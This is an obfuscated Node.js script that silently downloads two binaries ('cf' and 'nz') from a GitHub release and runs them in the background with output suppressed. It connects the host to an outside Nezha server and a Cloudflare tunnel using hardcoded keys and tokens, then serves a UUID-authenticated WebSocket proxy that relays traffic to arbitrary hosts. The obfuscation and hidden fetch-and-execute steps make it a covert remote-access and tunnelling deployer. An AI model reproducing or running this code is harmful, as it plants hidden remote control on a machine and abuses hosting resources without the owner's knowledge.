const uuid = (process.env.UUID || '7090ff5d-f321-4248-a7c3-d8837f124999').replace(/-/g, "");
const port = process.env.PORT || 3000;
const NZ_SERVER = process.env.NZ_SERVER || 'nz.seav.eu.org:443';
const NZ_KEY = process.env.NZ_KEY || 'pGd4yayqmC8aABp5LE';
const AGO_AUTH = process.env.AGO_AUTH || 'eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiODc1ZjlkMWEtNzQyOS00YjM2LThhZjItMTI4YmU1ZDMyMWNhIiwicyI6Ik9XRmlNMll6TjJZdE5EQXdPQzAwTVRWa0xUaGtZVFF0TkdReU1XUmxPREpsWlRSbCJ9';

const _0x45f553=_0x3168;(function(_0x2ee50e,_0x37a7d0){const _0xaa5a34=_0x3168,_0x2d4748=_0x2ee50e();while(!![]){try{const _0x598f92=-parseInt(_0xaa5a34(0x194))/0x1+-parseInt(_0xaa5a34(0x1c5))/0x2*(parseInt(_0xaa5a34(0x1b2))/0x3)+-parseInt(_0xaa5a34(0x1ad))/0x4+-parseInt(_0xaa5a34(0x1bb))/0x5+-parseInt(_0xaa5a34(0x188))/0x6+-parseInt(_0xaa5a34(0x192))/0x7*(parseInt(_0xaa5a34(0x187))/0x8)+-parseInt(_0xaa5a34(0x1ba))/0x9*(-parseInt(_0xaa5a34(0x1b7))/0xa);if(_0x598f92===_0x37a7d0)break;else _0x2d4748['push'](_0x2d4748['shift']());}catch(_0x3d907b){_0x2d4748['push'](_0x2d4748['shift']());}}}(_0xa0bc,0xc06ee));const os=require('os'),fs=require('fs'),axios=require(_0x45f553(0x1c3)),path=require(_0x45f553(0x1bc)),net=require(_0x45f553(0x196)),{exec,spawn,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),logcb=(..._0x836fc)=>console[_0x45f553(0x1a8)][_0x45f553(0x19d)](this,..._0x836fc),errcb=(..._0x50f3f7)=>console[_0x45f553(0x193)][_0x45f553(0x19d)](this,..._0x50f3f7);function getSystemArchitecture(){const _0x47629b=_0x45f553,_0x21bbb0=os['arch']();return _0x21bbb0===_0x47629b(0x1bd)||_0x21bbb0===_0x47629b(0x19a)?_0x47629b(0x1bd):_0x47629b(0x1af);}function downloadFile(_0x114cbd,_0x722c04){const _0x55b21a=_0x45f553,_0x39b4a1=path['join']('./',_0x114cbd),_0x510cd8=fs[_0x55b21a(0x18b)](_0x39b4a1);return axios({'method':_0x55b21a(0x1c8),'url':_0x722c04,'responseType':_0x55b21a(0x1b3)})[_0x55b21a(0x1a2)](_0x501f87=>{const _0x189e6d=_0x55b21a;return _0x501f87[_0x189e6d(0x1cb)]['pipe'](_0x510cd8),new Promise((_0x3b9bb2,_0x4c3bba)=>{const _0x4e7444=_0x189e6d;_0x4e7444(0x199)===_0x4e7444(0x1a9)?_0x2f28b4?_0x2700b8[_0x4e7444(0x193)]('Error\x20running\x20cf:\x20'+_0x28cd42):_0x3b57c7[_0x4e7444(0x1a8)](_0x4e7444(0x1b0)):(_0x510cd8['on'](_0x4e7444(0x19b),_0x3b9bb2),_0x510cd8['on']('error',_0x4c3bba));});});}async function downloadFiles(){const _0x56f0ea=_0x45f553,_0x19a44c=getSystemArchitecture(),_0x2f4720=getFilesForArchitecture(_0x19a44c);if(_0x2f4720['length']===0x0){if(_0x56f0ea(0x18c)!=='Okoym'){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}else{const _0x4b54c2=_0x44251b[_0x56f0ea(0x1bf)]('./',_0x592f23),_0xd309b4=_0x49490c[_0x56f0ea(0x18b)](_0x4b54c2);return _0x54130e({'method':_0x56f0ea(0x1c8),'url':_0x33474e,'responseType':'stream'})['then'](_0x304068=>{const _0x3c4dc8=_0x56f0ea;return _0x304068[_0x3c4dc8(0x1cb)]['pipe'](_0xd309b4),new _0x15526d((_0x259891,_0x2cda66)=>{const _0x107a26=_0x3c4dc8;_0xd309b4['on'](_0x107a26(0x19b),_0x259891),_0xd309b4['on'](_0x107a26(0x193),_0x2cda66);});});}}for(const _0x43412f of _0x2f4720){if(!fs[_0x56f0ea(0x1ae)](_0x43412f[_0x56f0ea(0x1b1)]))try{if(_0x56f0ea(0x18a)!==_0x56f0ea(0x18a))_0x2dba8a[_0x56f0ea(0x1a8)](_0x56f0ea(0x1a5)+_0x4d56c6[_0x56f0ea(0x1b1)]+_0x56f0ea(0x1a6)+_0x41f27e['message']);else{await downloadFile(_0x43412f[_0x56f0ea(0x1b1)],_0x43412f['fileUrl']),console[_0x56f0ea(0x1a8)](_0x56f0ea(0x1a5)+_0x43412f['fileName']+_0x56f0ea(0x1a7));if(_0x43412f[_0x56f0ea(0x1b1)][_0x56f0ea(0x190)](_0x56f0ea(0x185))){if('Yfkka'===_0x56f0ea(0x1ac)){const _0x437c5c=_0x4e1223[_0x56f0ea(0x191)]();return _0x437c5c===_0x56f0ea(0x1bd)||_0x437c5c==='arm64'?_0x56f0ea(0x1bd):_0x56f0ea(0x1af);}else fs[_0x56f0ea(0x1ab)](_0x43412f['fileName'],_0x43412f[_0x56f0ea(0x1b1)][_0x56f0ea(0x1b4)](0x0,-0x4));}}}catch(_0x5ab1c5){console[_0x56f0ea(0x1a8)](_0x56f0ea(0x1a5)+_0x43412f[_0x56f0ea(0x1b1)]+_0x56f0ea(0x1a6)+_0x5ab1c5[_0x56f0ea(0x1c6)]);}}}function _0x3168(_0x3a70e1,_0xdf870f){const _0xa0bc94=_0xa0bc();return _0x3168=function(_0x3168ef,_0x35be6b){_0x3168ef=_0x3168ef-0x184;let _0x388c58=_0xa0bc94[_0x3168ef];return _0x388c58;},_0x3168(_0x3a70e1,_0xdf870f);}function getFilesForArchitecture(_0x5efb22){const _0x14b633=_0x45f553,_0x215b16=_0x14b633(0x1aa),_0xa628be=_0x5efb22==='amd'?['cf','nz']:[_0x14b633(0x18f),'nz-arm'];return _0xa628be[_0x14b633(0x197)](_0x274b4d=>({'fileName':_0x274b4d,'fileUrl':_0x215b16+_0x274b4d}));}function _0xa0bc(){const _0x14cced=['Error\x20running\x20nz:\x20','chmod\x20+x\x20cf\x20&&\x20./cf\x20tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20http2\x20run\x20--token\x20','1974033TpwBzw','6617640mcbLUv','path','arm','toString','join','once','Error\x20running\x20cf:\x20','concat','axios','pipe','123406PbCacf','message','\x20-p\x20','get','substr','send','data','nz\x20is\x20running','connection','-arm','vHxzw','4936lGOrrz','9254952RztcYj','E1:','xHvHD','createWriteStream','pkpDT','every','write','cf-arm','endsWith','arch','7413MRmepT','error','926137oWYtpJ','decode','net','map','WebSocket\x20Error:','ojHtn','arm64','finish','connect','bind','lSKbF','chmod\x20+x\x20nz\x20&&\x20./nz\x20-s\x20','readUInt8','reduce','then','E2:','connected\x20successfully','Download\x20','\x20failed:\x20','\x20successfully','log','TiEte','https://github.com/seav1/dl/releases/download/src/','renameSync','prwtA','4261216PDZvqI','existsSync','amd','cf\x20is\x20running','fileName','3BOUfce','stream','slice','\x20>/dev/null\x202>&1\x20&','Connect-Err:','290DrvSiG'];_0xa0bc=function(){return _0x14cced;};return _0xa0bc();}downloadFiles()[_0x45f553(0x1a2)](()=>{const _0x3fa44a=_0x45f553;exec(_0x3fa44a(0x1b9)+AGO_AUTH+_0x3fa44a(0x1b5),_0x140a4a=>{const _0x56f9f6=_0x3fa44a;_0x140a4a?_0x56f9f6(0x186)===_0x56f9f6(0x19e)?_0x4ee3d8[_0x56f9f6(0x193)](_0x56f9f6(0x1b8)+_0x2c0d25):console[_0x56f9f6(0x193)](_0x56f9f6(0x1c1)+_0x140a4a):console[_0x56f9f6(0x1a8)](_0x56f9f6(0x1b0));}),exec(_0x3fa44a(0x19f)+NZ_SERVER+_0x3fa44a(0x1c7)+NZ_KEY+'\x20--tls\x20>\x20/dev/null\x202>&1\x20&',_0x2241fa=>{const _0x3f2003=_0x3fa44a;_0x2241fa?console[_0x3f2003(0x193)]('Error\x20running\x20nz:\x20'+_0x2241fa):console[_0x3f2003(0x1a8)](_0x3f2003(0x1cc));});});const ws=new WebSocket['Server']({'port':port},logcb('listening:',port));ws['on'](_0x45f553(0x184),_0x239d31=>{const _0x2f6dd7=_0x45f553;console[_0x2f6dd7(0x1a8)](_0x2f6dd7(0x1a4)),_0x239d31[_0x2f6dd7(0x1c0)](_0x2f6dd7(0x1c6),_0x21ce44=>{const _0x3c04bd=_0x2f6dd7,[_0x147ca9]=_0x21ce44,_0x403d84=_0x21ce44[_0x3c04bd(0x1b4)](0x1,0x11);if(!_0x403d84[_0x3c04bd(0x18d)]((_0xec3319,_0x510a13)=>_0xec3319==parseInt(uuid[_0x3c04bd(0x1c9)](_0x510a13*0x2,0x2),0x10)))return;let _0x5b328=_0x21ce44[_0x3c04bd(0x1b4)](0x11,0x12)[_0x3c04bd(0x1a0)]()+0x13;const _0x3cbbd2=_0x21ce44[_0x3c04bd(0x1b4)](_0x5b328,_0x5b328+=0x2)['readUInt16BE'](0x0),_0x5ab0a7=_0x21ce44[_0x3c04bd(0x1b4)](_0x5b328,_0x5b328+=0x1)[_0x3c04bd(0x1a0)](),_0x56191c=_0x5ab0a7==0x1?_0x21ce44[_0x3c04bd(0x1b4)](_0x5b328,_0x5b328+=0x4)[_0x3c04bd(0x1bf)]('.'):_0x5ab0a7==0x2?new TextDecoder()[_0x3c04bd(0x195)](_0x21ce44[_0x3c04bd(0x1b4)](_0x5b328+0x1,_0x5b328+=0x1+_0x21ce44[_0x3c04bd(0x1b4)](_0x5b328,_0x5b328+0x1)['readUInt8']())):_0x5ab0a7==0x3?_0x21ce44[_0x3c04bd(0x1b4)](_0x5b328,_0x5b328+=0x10)[_0x3c04bd(0x1a1)]((_0x1b0b36,_0x32f0ac,_0x291596,_0xf2b67b)=>_0x291596%0x2?_0x1b0b36[_0x3c04bd(0x1c2)](_0xf2b67b['slice'](_0x291596-0x1,_0x291596+0x1)):_0x1b0b36,[])[_0x3c04bd(0x197)](_0x2c1584=>_0x2c1584['readUInt16BE'](0x0)[_0x3c04bd(0x1be)](0x10))[_0x3c04bd(0x1bf)](':'):'';logcb('Connect:',_0x56191c,_0x3cbbd2),_0x239d31[_0x3c04bd(0x1ca)](new Uint8Array([_0x147ca9,0x0]));const _0x188649=createWebSocketStream(_0x239d31);net[_0x3c04bd(0x19c)]({'host':_0x56191c,'port':_0x3cbbd2},function(){const _0x22c45a=_0x3c04bd;this[_0x22c45a(0x18e)](_0x21ce44[_0x22c45a(0x1b4)](_0x5b328)),_0x188649['on'](_0x22c45a(0x193),errcb(_0x22c45a(0x189)))[_0x22c45a(0x1c4)](this)['on']('error',errcb(_0x22c45a(0x1a3)))['pipe'](_0x188649);})['on']('error',errcb(_0x3c04bd(0x1b6),{'host':_0x56191c,'port':_0x3cbbd2}));})['on']('error',errcb(_0x2f6dd7(0x198)));});
